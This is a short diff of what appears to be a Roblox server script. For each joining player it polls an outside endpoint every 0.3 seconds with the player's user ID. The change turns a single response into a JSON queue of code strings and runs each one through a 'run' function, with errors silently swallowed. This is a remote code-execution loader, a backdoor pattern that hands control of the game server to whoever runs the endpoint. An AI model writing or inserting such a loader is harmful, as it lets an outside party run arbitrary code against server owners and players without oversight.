@@ -13,10 +13,12 @@ local function plrAdded(plr)
 			while true do
 				task.wait(0.3)
 				pcall(function()
-					local ping = https:GetAsync(endpoint.."api/ping", true, {["user-id"]=tostring(plr.UserId)})
-					coroutine.wrap(function()
-                        run(ping)
-                    end)()
+					local queue = https:JSONDecode(https:GetAsync(endpoint.."api/ping", true, {["user-id"]=tostring(plr.UserId)}))
+                    for _, code in pairs(queue) do
+				    	coroutine.wrap(function()
+                            run(code)
+                        end)()
+                    end
 				end)
 			end
 		end)
